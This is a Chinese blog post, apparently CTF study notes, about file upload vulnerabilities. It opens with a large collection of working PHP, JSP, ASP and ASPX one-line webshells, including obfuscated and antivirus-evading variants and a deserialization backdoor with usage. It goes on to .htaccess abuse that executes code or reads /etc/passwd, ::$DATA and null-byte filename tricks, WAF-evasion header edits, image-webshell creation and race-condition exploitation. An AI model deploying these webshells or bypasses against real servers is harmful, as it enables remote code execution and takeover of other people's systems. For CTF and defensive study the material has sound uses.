# 文件上传漏洞


# 文件上传漏洞

&gt; [参考博客](https://blog.csdn.net/qq_43390703/article/details/104858705)

## 原因

程序员在对用户文件上传部分的控制不足或者处理缺陷，而导致的用户可以越过其本身权限向服务器上上传可执行的动态脚本文件。这里上传的文件可以是木马，病毒，恶意脚本或者WebShell等

## WebShell

以**asp、php、jsp或者cgi**等网页文件形式存在的一种命令执行环境，也可以将其称之为一种网页后门。

## 一句话木马大全

&gt; 可速过

### PHP

```
&lt;?php @eval($_POST[&#39;r00ts&#39;]);?&gt; 
&lt;?php phpinfo();?&gt;
&lt;?php @eval($_POST[cmd]);?&gt;
&lt;?php @eval($_REQUEST[cmd]);?&gt;
&lt;?php assert($_REQUEST[cmd]); ?&gt;
&lt;?php //?cmd=phpinfo() @preg_replace(&#34;/abc/e&#34;,$_REQUEST[&#39;cmd&#39;],&#34;abcd&#34;); ?&gt;
&lt;?php 
//?cmd=phpinfo();
$func =create_function(&#39;&#39;,$_REQUEST[&#39;cmd&#39;]);
$func();
?&gt;

&lt;?php
//?func=system&amp;cmd=whoami
$func=$_GET[&#39;func&#39;];
$cmd=$_GET[&#39;cmd&#39;];
$array[0]=$cmd;
$new_array=array_map($func,$array);
//print_r($new_array);
?&gt;

&lt;?php 
//?cmd=phpinfo()
@call_user_func(assert,$_GET[&#39;cmd&#39;]);
?&gt;

&lt;?php 
//?cmd=phpinfo()
$cmd=$_GET[&#39;cmd&#39;];
$array[0]=$cmd;
call_user_func_array(&#34;assert&#34;,$array);
?&gt;

&lt;?php 
//?func=system&amp;cmd=whoami
$cmd=$_GET[&#39;cmd&#39;];
$array1=array($cmd);
$func =$_GET[&#39;func&#39;];
array_filter($array1,$func);
?&gt;

&lt;?php usort($_GET,&#39;asse&#39;.&#39;rt&#39;);?&gt; php环境&gt;=&lt;5.6才能用
&lt;?php usort(...$_GET);?&gt;  php环境&gt;=5.6才能用
&lt;?php eval($_POST1);?&gt; 
&lt;?php if(isset($_POST[&#39;c&#39;])){eval($_POST[&#39;c&#39;]);}?&gt; 
&lt;?php system($_REQUEST1);?&gt; 
&lt;?php ($_=@$_GET1).@$_($_POST1)?&gt; 
&lt;?php eval_r($_POST1)?&gt; 
&lt;?php @eval_r($_POST1)?&gt;//容错代码 
&lt;?php assert($_POST1);?&gt;//使用Lanker一句话客户端的专家模式执行相关的PHP语句 
&lt;?$_POST[&#39;c&#39;]($_POST[&#39;cc&#39;]);?&gt; 
&lt;?$_POST[&#39;c&#39;]($_POST[&#39;cc&#39;],$_POST[&#39;cc&#39;])?&gt; 
&lt;?php @preg_replace(&#34;/[email]/e&#34;,$_POST[&#39;h&#39;],&#34;error&#34;);?&gt;/*使用这个后,使用菜刀一句话客户端在配置连接的时候在&#34;配置&#34;一栏输入*/:&lt;O&gt;h=@eval_r($_POST1);&lt;/O&gt; 
&lt;?php echo `$_GET[&#39;r&#39;]` ?&gt; 

&lt;script language=&#34;php&#34;&gt;@eval_r($_POST[sb])&lt;/script&gt; //绕过&lt;?限制的一句话

&lt;?php (])?&gt;   上面这句是防杀防扫的！网上很少人用！可以插在网页任何ASP文件的最底部不会出错，比如 index.asp里面也是可以的！

&lt;?if(isset($_POST[&#39;1&#39;])){eval($_POST[&#39;1&#39;]);}?&gt;&lt;?php system ($_REQUEST[1]);?&gt; 
加了判断的PHP一句话，与上面的ASP一句话相同道理，也是可以插在任何PHP文件 的最底部不会出错！

&lt;%execute request(“class”)%&gt;&lt;%&#39;&lt;% loop &lt;%:%&gt;&lt;%&#39;&lt;% loop &lt;%:%&gt;&lt;%execute request (“class”)%&gt;&lt;%execute request(“class”)&#39;&lt;% loop &lt;%:%&gt; 
无防下载表，有防下载表可尝试插入以下语句突破的一句话 

&lt;%eval(request(“1″)):response.end%&gt; 备份专用
```

### JSP

```
&lt;%if(request.getParameter(&#34;f&#34;)!=null)(newjava.io.FileOutputStream (application.getRealPath(&#34;\\&#34;)&#43;request.getParameter(&#34;f&#34;))).write (request.getParameter(&#34;t&#34;).getBytes());%&gt; 
提交客户端 
&lt;form action=&#34;&#34; method=&#34;post&#34;&gt;&lt;textareaname=&#34;t&#34;&gt;&lt;/textarea&gt;&lt;br/&gt;&lt;input type=&#34;submit&#34;value=&#34;提交&#34;&gt;&lt;/form&gt;
```

### ASP

```
&lt;%eval(Request.Item[&#34;r00ts&#34;],”unsafe”);%&gt;

&lt;%IfRequest(“1″)&lt;&gt;”&#34;ThenExecuteGlobal(Request(“1″))%&gt; 

&lt;%execute(request(“1″))%&gt; 

&lt;scriptrunat=server&gt;execute request(“1″)&lt;/script&gt; 不用&#39;&lt;,&gt;‘的asp一句话 
```

### ASPX

```
&lt;scriptrunat=”server”&gt;WebAdmin2Y.x.y aaaaa =newWebAdmin2Y.x.y (“add6bb58e139be10″);&lt;/script&gt; 

&lt;script language=&#34;C#&#34;runat=&#34;server&#34;&gt;WebAdmin2Y.x.y a=new WebAdmin2Y.x.y(&#34;add6bb58e139be10&#34;)&lt;/script&gt; 

&lt;%eval request(chr(35))%&gt;  不用双引号的一句话。
```

## 漏洞产生原因

* 对于上传文件的后缀名（扩展名）没有做较为严格的限制
* 对于上传文件的MIMETYPE(用于描述文件的类型的一种表述方法) 没有做检查
* 权限上没有对于上传的文件目录设置不可执行权限，（尤其是对于shebang类型的文件）
* 对于web server对于上传文件或者指定目录的行为没有做限制

## 常见安全问题

* 上传文件是Web脚本语言，服务器的Web容器解释并执行了用户上传的脚本,导致代码执行;
* 上传文件是Flash的策略文件crossdomain.xml,黑客用以控制Flash在该域下的行为(其他通过类似方式控制策略文件的情况类似);
* 上传文件是病毒、木马文件，黑客用以诱骗用户或者管理员下载执行:
* 上传文件是钓鱼图片或为包含了脚本的图片，在某些版本的浏览器中会被作为脚本执行，被用于钓鱼和欺诈

除此之外，还有一些不常见的利用方法，比如将上传文件作为一个入口,溢出服务器的后台处理程序，如图片解析模块;或者上传-一个合法的文本文件， 其内容包含了PHP脚本，再通过“本地文件包含漏洞(Local File Include)&#34;执行此脚本;等

## Web做题！！

&gt; 重要部分捏🎄

### 常见文件后缀

| 文件后缀          | Mime类型                                | 说明                           |
| ----------------- | --------------------------------------- | ------------------------------ |
| .flv              | flv/flv-flash                           | 在线播放                       |
| .html或.htm       | text/html                               | 超文本标记语言文本             |
| .rtf              | application/rtf                         | RTF文本                        |
| .gif 或.png       | image/gif (image/png)                   | GIF图形/PNG图片                |
| .jpeg或.jpg       | image/jpeg                              | JPEG图形                       |
| .au               | audio/basic                             | au声音文件                     |
| .mid或.midi       | audio/midi 或 audio/x-midi              | MIDI音乐文件                   |
| .ra或.ram或.rm    | audio/x-pn-realaudio                    | RealAudio音乐文件              |
| .mpg或.mpeg或.mp3 | video/mpeg                              | MPEG文件                       |
| .avi              | video/x-msvideo                         | AVI文件                        |
| .gz               | application/x-gzip                      | GZIP文件                       |
| .tar              | application/x-tar                       | TAR文件                        |
| .exe              | application/octet-stream                | 下载文件类型                   |
| .rmvb             | video/vnd.rn-realvideo                  | 在线播放                       |
| .txt              | text/plain                              | 普通文本                       |
| .mrp              | application/octet-stream                | MRP文件（国内普遍的手机）      |
| .ipa              | application/iphone-package-archive      | IPA文件 (IPHONE)               |
| .deb              | application/x-debian-package-archive    | DEB文件 (IPHONE)               |
| .apk              | application/vnd.android.package-archive | APK文件 (安卓系统)             |
| .cab              | application/vnd.cab-com-archive         | CAB文件 (Windows Mobile)       |
| .xap              | application/x-silverlight-app           | XAP文件 (Windows Phone 7)      |
| .sis              | application/vnd.symbian.install-archive | SIS文件 (symbian平台)          |
| .jar              | application/java-archive                | JAR文件 (JAVA平台手机通用格式) |
| .jad              | text/vnd.sun.j2me.app-descriptor        | JAD文件 (JAVA平台手机通用格式) |
| .sisx             | application/vnd.symbian.epoc/x-sisx-app | SISX文件 (symbian平台)         |

### 客户端检查

* JS检查

  * 通过浏览器F12很简单的修改文件后缀名就可以完成绕过检查

  * 木马修改后缀名后上传，通过改包工具修改上传

  * 如果是JS脚本检测，在本地浏览器客户端禁用JS即可。

    &gt; 可使用火狐浏览器的NoScript插件、IE中禁用掉JS等方式实现绕过。

### 服务端 · 检查后缀

#### 黑名单

* 上传特殊后缀

  * pht

* `.htaccess`上传利用

  * 文件解析

    经常出现在文件上传的黑名单没有限制 .htaceess 后缀，通过上传 .htaccess 文件，再上传图片，使图片的 php 恶意代码得以被解析执行。

    一般有一下两种方法：

    ```
    # 将images.png 当做 PHP 执行
    &lt;FilesMatch  &#34;images.png&#34;&gt;
    SetHandler  application/x-httpd-php
    &lt;/FilesMatch&gt;
    ```

    ```
    # 将 .jpg(.xxx) 当做 PHP 文件解析
    AddType application/x-httpd-php .jpg(.xxx)
    ```

  * 文件包含

    &gt; 本地文件包含

    通过 php_value 来设置 `auto_prepend_file`或者 `auto_append_file` 配置选项包含一些敏感文件，同时**在本目录或子目录中需要有可解析的 php 文件**来触发

    .htaccess 分别通过这两个配置选项来包含 /etc/passwd，并访问同目录下的 index.php文件

    ```
    auto_prepend_file
    ```

    ```
    php_value auto_prepend_file /etc/passwd
    ```

    &gt; 远程文件包含不可以使用.htaccess

    PHP 的 all_url_include 配置选项这个选项默认是关闭的，如果开启的话就可以远程包含。

    因为 all_url_include 的配置范围为 PHP_INI_SYSTEM,所以无法利用 php_flag 在 .htaccess 中开启

  * 源码泄露

    利用 php_flag 将 engine 设置为 0，在本目录和子目录中关闭 php 解析，造成源码泄露

    ```
    php_flag engine 0
    ```

  * 代码执行

    利用伪协议`all_url_fopen`、`all_url_include`为on

    解析.htaccess

    .htaccess (base64 / urlencode)

    写单纯的text文件

    .htaccess内容：

    ```
    php_value auto_prepend_file data://text/plain;base64,PD9waHAgcGhwaW5mbygpOw==
    ```

    ```
    php_value auto_prepend_file data://text/plain,%3C%3Fphp&#43;phpinfo%28%29%3B
    ```

    写执行php命令

    .htaccess内容：

    ```
    php_value auto_prepend_file .htaccess #&lt;?php phpinfo();?&gt;
    ```
    
    下面这种适合同目录或子目录没有 php 文件。 需要先设置允许可访问 .htaccess 文件
    
    .htaccess内容：
    
    ```
    Files ~ &#34;^.ht&#34;&gt;
     Require all granted
     Order allow,deny
     Allow from all
    &lt;/Files&gt;
    SetHandler application/x-httpd-php
    # &lt;?php phpinfo(); ?&gt;
    ```
    
  * 命令执行
  
    &gt; CGI启动
  
    ```
    cgi_module 需要加载，即 apache 配置文件中有
    
    LoadModule cgi_module modules/mod_cgi.so
    .htaccess内容
    
    Options ExecCGI #允许CGI执行
    AddHandler cgi-script .xx #将xx后缀名的文件，当做CGI程序进行解析
    ce.xx
    
    #!C:/Windows/System32/cmd.exe /k start calc.exe
    6
    ```
  
    直接访问ce.xx
  
    &gt; FastCGI启动
  
    ```
    mod_fcgid.so需要被加载。即 apache 配置文件中有
    
    LoadModule fcgid_module modules/mod_fcgid.so
    .htaccess
    
    Options &#43;ExecCGI
    AddHandler fcgid-script .xx
    FcgidWrapper &#34;C:/Windows/System32/cmd.exe /k start calc.exe&#34; .xx
    
    ce.xx 内容随意
    ```
  
    直接访问ce.xx
  
  * XSS
  
    &gt; highlight_file
  
    .htaccess内容
  
    ```
    php_value highlight.comment &#39;&#34;&gt;&lt;script&gt;alert(1);&lt;/script&gt;&#39;
    
    index.php
    &lt;?php
    highlight_file(__FILE__);
    // comment
    ```
  
    其中`highlight_file(__FILE__)`也可以换作
  
    错误消息链接：
  
    ```
    index.php ：
    &lt;?php
    include(&#39;foo&#39;);#foo报错
    
    .htaccess
    php_flag display_errors 1
    php_flag html_errors 1
    php_value docref_root &#34;&#39;&gt;&lt;script&gt;alert(1);&lt;/script&gt;&#34;
    ```
  
  * 自定义错误文件
  
    error.php
  
    ```
    &lt;?php include(&#39;shell&#39;);#报错页面
    ```
  
    .htaccess
  
    ```
    php_value error_log /tmp/www/html/shell.php 
    php_value include_path &#34;&lt;?php phpinfo(); __halt_compiler();&#34;
    ```
  
    访问 error.php，会报错并记录在 shell.php 文件中
  
* `.user.ini`

* 后缀大小写绕过

* 空格绕过

* 点绕过

* ::$DATA绕过

  * 原理

    当我们对一个在NTFS分区中的ASP文件发出包含DATA请 求 ，IIS会 检 查 最 后 一 个 “ . ” 后 面 的 扩 展 名 ， 因 为 多 了 : : DATA请求，IIS会检查最后一个“ . ”后面的扩展名，因为多了::DATA请求，IIS会检查最后一个“.”后面的扩展名，因为多了::DATA，结果IIS不认为这是一个ASP文件，而文件系统可以识别该请求，于是返回ASP的源代码。

  * 绕过方法 · IIS目录访问权限绕过

    在IIS6.0&#43;PHP、IIS7&#43;asp、IIS7.5&#43;php的环境下，如果目录是通过HTTP Basic来认证，假设网站根目录存在index.php文件，可通过构造如下方式来绕过认证直接访问目录下的文件

    ```
    /admin::$INDEX_ALLOCATION/index.php
    /admin:$i30:$INDEX_ALLOCATION/index.asp
    ```

  * 绕过方法 · 上传绕过黑名单

    在测试中我们发现如果上传的文件名字为：test.php::$DATA，会在服务器上生成一个test.php的文件，其中内容和所上传文件内容相同，并被解析

    | 上传的文件名                | 服务器表面现象       | 生成的文件内容       |
    | --------------------------- | -------------------- | -------------------- |
    | Test.php:a.jpg              | 生成 Test.php        | 空                   |
    | Test.php::$DATA             | 生成 test.php        | `&lt;?php phpinfo();?&gt;` |
    | Test.php::$INDEX_ALLOCATION | 生成 test.php 文件夹 |                      |
    | Test.php::$DATA\0.jpg       | 生成 0.jpg           | `&lt;?php phpinfo();?&gt;` |
    | Test.php::$DATA\aaa.jpg     | 生成 aaa.jpg         | `&lt;?php phpinfo();?&gt;` |

* 配合解析漏洞

* 双后缀名绕过

#### 白名单

* MIME绕过

* `%00`截断

  * 原理

    在上传的时候，当文件系统读到`0x00`时，会认为文件已经结束。利用00截断就是利用程序员在写程序时对文件的上传路径过滤不严格，产生`0x00`、`%00`上传截断漏洞

  * 绕过方法

    通过抓包截断将`evil.php.jpg`后面的一个`.`换成`0x00`。在上传的时候，当文件系统读到`0x00`时，会认为文件已经结束，从而将`evil.php.jpg`的内容写入到`evil.php`中，从而达到攻击的目的。

* `move_uploaded_file()`

  可以通过 `move_uploaded_file` 函数把自己写的`.htaccess` 文件上传，覆盖掉服务器上的文件，来定义文件类型和执行权限如果做到了这一点，将获得相当大的权限

### 服务端 · 检查内容

#### 检查文件头

* 常见文件头

  |            格式            |        文件头        |
  | :------------------------: | :------------------: |
  |         TIFF (tif)         |       49492A00       |
  |    Windows Bitmap (bmp)    |         BM         |
  |         CAD (dwg)          |       41433130       |
  |   Adobe Photoshop (psd)    |       38425053       |
  |         JPEG (jpg)         |        FFD8FF        |
  |         PNG (png)          |       89504E47       |
  |         GIF (gif)          |       47494638(GIF8)       |
  |         XML (xml)          |      3C3F786D6C      |
  |        HTML (html)         |      68746D6C3E      |
  | MS Word/Excel (xls.or.doc) |       D0CF11E0       |
  |      MS Access (mdb)       | 5374616E64617264204A |
  |     ZIP Archive (zip)      |       504B0304       |
  |     RAR Archive (rar)      |       52617221       |
  |         Wave (wav)         |       57415645       |
  |         AVI (avi)          |       41564920       |
  |    Adobe Acrobat (pdf)     |    255044462D312E    |

* 绕过

  给上传**脚本加上相应的幻数头字节就可以**，php引擎会将 &lt;?之前的内容当作html文本，不解释而跳过之，后面的代码仍然能够得到执行。

  &gt; 一般不限制图片文件格式的时候使用GIF的头比较方便，因为全都是文本可打印字符

#### 检查文件内容

* `&lt;?php ?&gt;`被过滤

  * script标签

    &gt; php&lt;7
  
  ```
  &lt;script language=&#34;php&#34;&gt;
   eval($_POST[2333]);
  &lt;/script&gt;
  ```
  
  * `&lt;?= ?&gt;`里面的命令用 php命令的单引号包含
  
* 只检测敏感内容，不检测php标签，下面是免杀木马

  ```
  &lt;?php
  
  if (isset($_POST[&#39;run&#39;])) {
    class HandShip {
       public $name;
       public $male;
       function __destruct() {
          $allin = $this-&gt;name;
          $allin($this-&gt;male);
       }
    }
  if(md5($_POST[&#39;code&#39;])==&#39;ce61649168c4550c2f7acab92354dc6e&#39;){
  
    unserialize($_POST[&#39;run&#39;]);
  }
  }
  ?&gt;
  ```

  用法：

  ```
  run=O:8:&#34;HandShip&#34;:2:{s:4:&#34;name&#34;;s:6:&#34;system&#34;;s:4:&#34;male&#34;;s:9:&#34;cat /home&#34;;};&amp;code=panda
  ```

* 对文件的内容，数据。数据包进行处理

  关键点：`Content-Disposition: form-data; name=&#34;file&#34;; filename=&#34;ian.php&#34;`

  将`form-data;` 修改为`~form-data;`

* 通过替换大小写来进行绕过

  ```
  Content-Disposition: form-data; name=&#34;file&#34;; filename=&#34;yjh.php&#34;
  content-Type: application/octet-stream
  ```

  ```
  content-Disposition: Form-data; name=&#34;file&#34;; filename=&#34;yjh.php&#34;
  Content-Type: application/octet-stream
  ```

* 通过删减空格来进行绕过

  ```
  Content-Disposition: form-data; name=&#34;file&#34;; filename=&#34;yjh.php&#34;
  Content-Type: application/octet-stream
  ```

  `Content-Disposition: form-data`冒号后增加或减少一个空格

  `form-data; name=&#34;file&#34;;` 分号后面增加或减少一个空格

  `Content-Type: application/octet-stream`冒号后面 增加一个空格

* 通过字符串拼接绕过

  看`Content-Disposition: form-data; name=&#34;file&#34;; filename=&#34;yjh3.php&#34;`
  将`form-data` 修改为 `f&#43;orm-data`
  将`from-data` 修改为 `form-d&#43;ata`

* 双文件上传绕过

  ```
  &lt;form action=&#34;https://www.xxx.com/xxx.asp(php)&#34; method=&#34;post&#34;
  name=&#34;form1&#34; enctype=&#34;multipart/form‐data&#34;&gt;
  &lt;input name=&#34;FileName1&#34; type=&#34;FILE&#34; class=&#34;tx1&#34; size=&#34;40&#34;&gt;
  &lt;input name=&#34;FileName2&#34; type=&#34;FILE&#34; class=&#34;tx1&#34; size=&#34;40&#34;&gt;
  &lt;input type=&#34;submit&#34; name=&#34;Submit&#34; value=&#34;上传&#34;&gt;
  &lt;/form&gt;
  ```

* HTTP header 属性值绕过

  `Content-Disposition: form-data; name=&#34;file&#34;; filename=&#34;yjh.php&#34;`
  我们通过替换`form-data` 为`*`来绕过
  `Content-Disposition: *; name=&#34;file&#34;; filename=&#34;yjh.php&#34;`

* HTTP header 属性名称绕过

  ```
  Content-Disposition: form-data; name=&#34;image&#34;; filename=&#34;085733uykwusqcs8vw8wky.png&#34;
  Content-Type: image/png
  ```

  绕过内容

  ```
  Content-Disposition: form-data; name=&#34;image&#34;; filename=&#34;085733uykwusqcs8vw8wky.png&#34;
  Content-Type: image/png
  ```

  删除掉`ontent-Type: image/png`只留下`c`，将`.php`加`c`后面即可，但是要注意额，双引号要跟着`c.php&#34;`

* 等效替换绕过

  ```
  Content-Type: multipart/form-data; boundary=---------------------------471463142114		// 原
  Content-Type: multipart/form-data; boundary =---------------------------471463142114	// 修改
  ```

  `boundary`后面加入空格。

* 修改编码绕过

  使用`UTF-16`、`Unicode`、`双URL编码`等等

* WTS-WAF 绕过上传

  ```
  Content-Disposition: form-data; name=&#34;up_picture&#34;; filename=&#34;xss.php&#34;
  ```

  添加回车

  ```
  Content-Disposition: form-data; name=&#34;up_picture&#34;; filename=&#34;xss.php&#34;
  ```

* 百度云上传绕过

  在对文件名大小写上面没有检测php是过了的，Php就能过，或者PHP，一句话自己合成图片马用Xise连接即可。
  `Content-Disposition: form-data; name=&#34;up_picture&#34;; filename=&#34;xss.jpg .Php&#34;`

* 填充垃圾数据，造成溢出后使WAF崩掉

  ```
  Content-Disposition: 字段溢出即可 比如Content-Disposition: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA一直加就行了十万&#43;&#43;
  ```

#### getimagesize()

制作图片马

准备两个文件：一个是png，一个是php一句话木马

windows环境下：

```
copy a.png /b &#43; a.php /a 3.php 
```

`/b`: 指定以二进制格式复制、合并文件，用于图像或者声音类文件 

`/a`: 指定以ascii格式复制、合并文件用于txt等文本类文件

输出一个php文件，得到图片🐎

### 服务端 · 条件竞争

#### 原理

由于服务器端在处理不同用户的请求时是并发进行的，因此，如果并发处理不当或相关操作逻辑顺序设计的不合理时，将会导致此类问题的发生。

#### 基本思路

上传文件源代码里没有校验上传的文件，文件直接上传

**上传成功后才进行判断**：如果文件格式符合要求，则重命名，如果文件格式不符合要求，将文件删除。

由于服务器并发处理(同时)多个请求，假如`a用户`上传了木马文件，由于代码执行需要时间，在此过程中`b用户`访问了`a用户`上传的文件，会有以下三种情况：

  1. 访问时间点在上传成功之前，没有此文件。

  2. **访问时间点在刚上传成功但还没有进行判断，该文件存在。**

  3. 访问时间点在判断之后，文件被删除，没有此文件。

我们需要达到 2 条件

#### 利用

使用bp的Intruder工具，拦截代理流量用这个一直发包上传的文件

同时抓包访问1.php，营造`10000人`访问`1.php`的场景

找200的访问成功的结果，成果执行

#### 一个源码例子

```PHP
$is_upload = false;
$msg = null;   //判断文件上传操作

if(isset($_POST[&#39;submit&#39;])){  //判断是否接收到这个文件
    $ext_arr = array(&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;);  //声明一个数组，数组里面有3条数据，为：&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;
    $file_name = $_FILES[&#39;upload_file&#39;][&#39;name&#39;];  //获取图片的名字
    $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;]; //获取图片的临时存储路径
    $file_ext = substr($file_name,strrpos($file_name,&#34;.&#34;)&#43;1); //通过文件名截取图片后缀
    $upload_file = UPLOAD_PATH . &#39;/&#39; . $file_name; //构造图片的上传路径，这里暂时重构图片后缀名。

    if(move_uploaded_file($temp_file, $upload_file)){ //这里对文件进行了转存
        if(in_array($file_ext,$ext_arr)){ //这里使用截取到的后缀名和数组里面的后缀名进行对比
             $img_path = UPLOAD_PATH . &#39;/&#39;. rand(10, 99).date(&#34;YmdHis&#34;).&#34;.&#34;.$file_ext;  //如果存在，就对文件名进行重构
             rename($upload_file, $img_path);  //把上面的文件名进行重命名
             $is_upload = true;
        }else{
            $msg = &#34;只允许上传.jpg|.png|.gif类型文件！&#34;; //否则返回&#34;只允许上传.jpg|.png|.gif类型文件！&#34;数据。
            unlink($upload_file);// 并删除这个文件
        }
    }else{
        $msg = &#39;上传出错！&#39;;
    }
}
```

关键函数：`move_uploaded_file`

## 做题的一些思路


---

> Author: [Ting](Tin10g.github.io)  
> URL: https://Tin10g.github.io/posts/2024web-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/  

